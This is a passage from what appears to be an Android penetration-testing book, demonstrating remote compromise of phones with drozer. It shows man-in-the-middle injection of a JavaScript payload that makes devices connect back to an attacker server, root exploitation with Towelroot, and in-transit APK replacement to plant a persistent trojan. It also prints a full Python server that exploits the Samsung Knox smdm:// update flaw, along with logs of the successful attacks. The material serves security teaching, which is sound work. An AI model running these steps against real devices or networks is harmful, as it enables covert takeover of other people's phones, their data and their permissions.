- accepted connection from 5i995jpik7r7h
2014-11-14 12:12:10,067 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 1b6b125f54bdda30
You receive a reverse shell connection and two more drozer sessions! Querying the server now shows three
connected sessions:
$ drozer console devices --server 127.0.0.1:80
List of Bound Devices
Device ID Manufacturer Model Software
5i995jpik7r7h samsung GT-I9300 4.0.4
2df0s1l8t5vld samsung GT-I9300 4.0.4
1b6b125f54bdda30 samsung GT-I9300 4.0.4
Notice that one of these sessions has a longer Device ID. This is because drozer assigns shorter Device IDs to
the JAR agent loaded through exploitation techniques than installed versions of the agent. Connecting to the
session with the longer ID reveals that this is an installed version of drozer:
$ drozer console connect 1b6b125f54bdda30 --server 192.168.1.112:80
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz> shell
app_129@android:/data/data/com.mwr.dz $
This session has a huge set of permissions assigned to it and can also make use of the planted su inside a shell
to obtain root access. It is fair to say that this device has been completely compromised simply by browsing to a
website! Other web browsers that contain JavaScript interfaces and target API versions of 16 or less will be
exploitable in exactly the same fashion.
Man-in-the-Middle Exploits
You can intercept connections from users on a huge scale if you are an organization that provides Internet
services to the masses. Similarly, breaking SSL is easy if you are a government that has influence on a CA that is
trusted by your device. However, we will explore man-in-the-middle (MitM) attacks that do not rely on such
access. Two suitable ways to ensure that you are in a position to perform man-in-the-middle attacks are by:
Hosting your wireless network with free Internet access. You can define your own default gateway to the
Internet or perform a variety of other setups that ensure that you can manipulate traffic.
Connecting to a wireless network with your computer, which allows you to perform ARP spoofing attacks on
devices on the same subnet as your computer.
General exploitation steps for performing MitM attacks on a connected wireless network are:
Connect to a wireless network where you know Android devices are also connected.
ARP spoof the entire network so that their traffic comes through your computer.
Run Burp and start an invisible proxy listener on port 8080.
Use iptables to redirect traffic from port 80 to your proxy on port 8080.
Injecting Exploits for JavaScript Interfaces
Devices that contain applications making use of JavaScript interfaces and loading content over the Internet are
at risk of being exploited. An attacker who is in the position to inject arbitrary JavaScript into HTTP responses
that end up being interpreted by a WebView can exploit devices with a huge success rate. Even the latest devices
at the time of writing could be remotely exploited if applications on the device are using vulnerable WebView
components and application configuration.
Without further ado, let's exploit a Sony Xperia Z2 running Android 4.4.2 using a MitM attack. The particular
application we are going to be exploiting loads advertisements. Advertising companies make use of WebViews
with JavaScript interfaces to load these adverts over cleartext. They are some of the worst offenders of this issue
as per https://www.mwrinfosecurity.com/ articles/ad-network-research/. This means that if the application
is targeting an SDK version of 16 or lower, you can compromise this application using MitM attacks. For this
example, you will be using the same exploit setup in drozer used earlier in the Android Browser JavaScript
interface example. Except now instead of being able to visit a web page that loads dz.js, you will be actively
injecting it into HTTP responses. Perform your usual MitM setup using Ettercap and Burp and then load the
drozer MitM helper extension. Make use of the JavaScript Injection tool to inject links to
http://192.168.1.112/dz.js and then click the button to enable it. Figure 8.6 shows this setup.
Figure 8.6 Setting up the drozer MitM helper extension for JavaScript injection
On the device, the test application that loads an advertisement is opened. This causes a request to be made to
the server and the Burp extension injects the following into the reply:
This is done using a few techniques that look for good places to reliably inject into the HTML. As soon as the
request is made, it injects the JavaScript into a response, as shown in Figure 8.7.
Figure 8.7 Burp extension showing that an injection has taken place
The application immediately retrieves dz.js from the drozer server and loads it. In the same way as before,
dz.js uses weasel with the help of libWebViewContext.so to load a drozer agent inside the application and
connect it to your server. This is shown in the drozer server log:
2014-11-14 15:33:58,692 - drozer.server.protocols.http - INFO - GET
/dz.js
2014-11-14 15:34:25,103 - drozer.server.protocols.http - INFO - GET
/server.settings
2014-11-14 15:34:25,803 - drozer.server.protocols.http - INFO - GET
/libWebViewContext.so
2014-11-14 15:34:25,842 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-14 15:34:26,669 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from qv72depj41ld
Listing the available connections on the drozer server shows that a Sony D6503 is connected:
$ drozer console devices --server 127.0.0.1:80
List of Bound Devices
Device ID Manufacturer Model Software
qv72depj41ld Sony D6503 4.4.2
Connecting to this and checking what permissions you have obtained reveals the following, which matches that
of the vulnerable application:
$ drozer console connect qv72depj41ld --server 192.168.1.112:80
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz> permissions
Has ApplicationContext: YES
Available Permissions:
- android.permission.ACCESS_NETWORK_STATE
- android.permission.CAMERA
- android.permission.INTERNET
- android.permission.READ_EXTERNAL_STORAGE
- android.permission.WRITE_CALENDAR
- android.permission.WRITE_CONTACTS
- android.permission.WRITE_EXTERNAL_STORAGE
At the time of writing, this was a fairly up-to-date device. However, it was still vulnerable to the Futex
vulnerability discussed in Chapter 6 that can be exploited by Towelroot. You can use a post-exploitation module
inside drozer at exploit.root.towelroot to obtain root on this device. Details on this module are:
dz> ls towel
exploit.root.towelroot Obtain a root shell on devices running Android
4.4 KitKat and/or kernel build date  run exploit.root.towelroot
[*] Uploading towelroot
[*] Upload successful
[*] chmod 770 /data/data/com.conversantmedia.sdksample/towelroot
[*] WARNING: Do not type 'exit' - rather use Control+C otherwise you
will reboot the device!
[*] Executing...hold thumbs...
/system/bin/sh: can't find tty fd: No such device or address
/system/bin/sh: warning: won't have full job control
u0_a246@D6503:/data/data/com.conversantmedia.sdksample # id
uid=0(root) gid=0(root)
groups=1015(sdcard_rw),1028(sdcard_r),2991(removable_rw),3003(inet),
50246(all_a246) context=u:r:kernel:s0
TIP
If you are running a root exploit and it does not show the shell prompt, simply type sh -i to spawn a new
shell that displays a prompt. However, be careful of using this on devices with SELinux in enforcing mode
because this may provide you a different SELinux context than the originally spawned shell.
Custom Application Updates
Some application developers design pre-installed applications to manage their own application updates through
their own code and not through a management system like an app store. For applications to install their own
updates they would need to hold the INSTALL_PACKAGES permission. Typically, these applications check a server
on the Internet for the latest available version of their Android package and then download the APK from the
server if a newer version than the one installed is available.
An alarming number of device manufacturers do this and even download these new APKs over a cleartext HTTP
connection. This gives attackers an opportunity to intercept APKs in transit and replace them with a malicious
package, like a rogue drozer agent. To perform this attack on a connected wireless network, do the usual MitM
setup with Ettercap and Burp. Then load the drozer MitM helper extension and use the APK Replacement tool.
If anyone you are intercepting traffic for downloads an APK over cleartext, it will be replaced with the APK you
provided. If you have chosen to use a rogue drozer agent as your payload, then after it has been replaced you will
need to invoke it. Again, this is because applications are installed in an inactive state and so it would need to be
actively invoked. You can do this by using the Invoke drozer using pwn:// tool in the Burp extension. Figure 8.8
shows a screenshot of this setup.
Figure 8.8 Setting up the drozer MitM helper extension to replace APKs and then invoke them
Invoking the drozer agent means injecting code that tries to load a page from a URI starting with pwn:// into the
HTML of a response. The difference between active invocation and passive invocation is that passive invocation
injects an iframe into the HTML that loads from pwn:// whereas active invocation redirects the browser to
pwn://. Active invocation is much more noticeable but is unfortunately the only option on Chromium versions
25 and later. Invoking the agent on a newer device would require the “active invocation” checkbox to be ticked.
This example mimics a scenario where an application downloads an APK in cleartext. To do this you browse to a
website that hosts an APK and install it.
The log in the Burp MitM extension looks like the following:
2014-11-16 13:17:03 http://37.48.83.23:80/download/TeamViewer.apk Got
request for APK...
2014-11-16 13:17:06 http://37.48.83.23:80/download/TeamViewer.apk
Replaced APK!
You can now assume that this has been installed on the device. Now attempt to invoke the agent through the
pwn:// handler. Any website that the user visits will have this URI injected into it. After browsing to a website
on the device, you receive the following in the extension's log:
2014-11-16 13:20:01 http://www.somesite.co.za:80/ Injected drozer
invocation with pwn://
You also receive your session in the drozer server log:
2014-11-16 15:20:12,672 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 7266ee96657c506
Querying the drozer server for the connected devices results in the following:
$ drozer console devices --server 192.168.1.112:80
List of Bound Devices
Device ID Manufacturer Model Software
7266ee96657c506 asus Nexus 7 5.0
This was performed on a Nexus 7 tablet running Android 5.0. Although the scenario was fictitious you can see
how it can be blindly applied on a network of unknown devices to install rogue drozer agents on devices.
Admittedly, it does require a degree of luck with the timing of update requests from devices, but the reward is a
persistent Trojan on a remote device with a lot of permissions!
This attack could similarly be applied to applications that load code from remote sources. A great example of
this is the AppLovin Ad Library that loaded JAR files from remote sources (see
https://labs.mwrinfosecurity.com/blog/2013/11/20/applovin-ad-library-sdk-remote-command-execution-
via-update-mechanism/). It retrieved JAR files over a cleartext connection and then blindly loaded them into the
application.
BROWSABLE URI Injection
Applications that have an intent filter for an activity defined with the BROWSABLE category set have the ability to
be invoked from a web browser. Any chain of events that takes place after invocation should be highly
scrutinized by attackers because it is a lucrative target for exploitation. An excellent example of such an attack is
the UniversalMDMClient application, which is part of the Samsung Knox suite of applications present on many
high-end Samsung devices. It has the following intent filter defined on one of its activities:
On November 16, 2014, André Moulu from Quarkslab found a vulnerability in this application that can be used
to remotely exploit it. He found a code path that can allow the installation of arbitrary packages that can be
invoked by the following URI:
smdm://whatever?update_url=http://yourserver/
When this activity is invoked in this manner it contacts the server specified in the update_url parameter with a
path of //latest. As long as the server responds with the following server headers, the attack goes ahead:
Content-Length—The size of the APK it is retrieving
ETag—Any unique string such as the MD5 hash of the APK
x-amz-meta-apk-version—The latest available version of the application
After the application gets the response back from the server, it prompts the user to install the update. You can
see an example of this in Figure 8.9.
Figure 8.9 The prompt shown to the user after a valid response is obtained from the server
If the user accepts this prompt, the application is installed from the remote server. The proof of concept
provided by André at http://blog.quarkslab .com/abusing-samsung-knox-to-remotely-install-a-malicious-
application-story-of-a-half-patched-vulnerability.html can be used to compromise a device using MitM
techniques. In this example a rogue drozer agent is provided as the APK to be installed on the device and so the
proof of concept was slightly tweaked to accommodate this. In addition, the listening port of the server was
changed. The resulting code is as follows:
import hashlib
from BaseHTTPServer import BaseHTTPRequestHandler
APK_FILE = "agent.apk"
APK_DATA = open(APK_FILE,"rb").read()
APK_SIZE = str(len(APK_DATA))
APK_HASH = hashlib.md5(APK_DATA).hexdigest()
class MyHandler(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(200)
self.send_header("Content-Length", APK_SIZE)
self.send_header("ETag", APK_HASH)
self.send_header("x-amz-meta-apk-version", "1337")
self.end_headers()
self.wfile.write(APK_DATA)
return
def do_HEAD(self):
self.send_response(200)
self.send_header("Content-Length", APK_SIZE)
self.send_header("ETag", APK_HASH)
self.send_header("x-amz-meta-apk-version", "1337")
self.end_headers()
return
if __name__ == "__main__":
from BaseHTTPServer import HTTPServer
server = HTTPServer(('0.0.0.0',4444), MyHandler)
server.serve_forever()
This code creates an HTTP server listening on port 4444. Now you can set up the Custom URI Handler Injection
tool in the drozer MitM helper extension in Burp to look like Figure 8.10.
Figure 8.10 The configuration of the Custom URI Handler Injection section of the drozer Burp plug-in
Providing agent.apk in the same directory as the server and then performing usual MitM techniques and
proxying traffic through Burp will allow the compromise of various Samsung devices (with Knox support) on
the network. Visiting a cleartext website on a Samsung Galaxy S5 results in the following log entry in the Burp
plug-in:
2014-11-16 10:47:42 http://www.somesite.co.za:80/ Injected custom URI
Simultaneously, the following is printed to screen from André's Python script:
192.168.1.112 - - [16/Nov/2014 10:47:41] "HEAD //latest HTTP/1.1" 200 -
192.168.1.112 - - [16/Nov/2014 10:47:50] "GET //latest HTTP/1.1" 200 -
The presence of the HEAD request tells us that the custom URI was successfully injected and the
UniversalMDMClient activity was opened. The GET request tells us that the user has accepted the prompt and
chosen to install the application. Note that if the user chooses not to install the application, the Burp extension
will simply inject it again into the next HTTP response and prompt the user again. You can keep the URI
injection running until the user chooses to accept the prompt and install the application. After you receive the
GET request, you can assume that the application has been installed. Then you need to invoke the installed
drozer package in the same way shown earlier. Note that turning this exploit into a completely remote one
without the need for MitM is also possible. A remote exploit for this can be found in drozer at exploit
.remote.browser.knoxsmdm.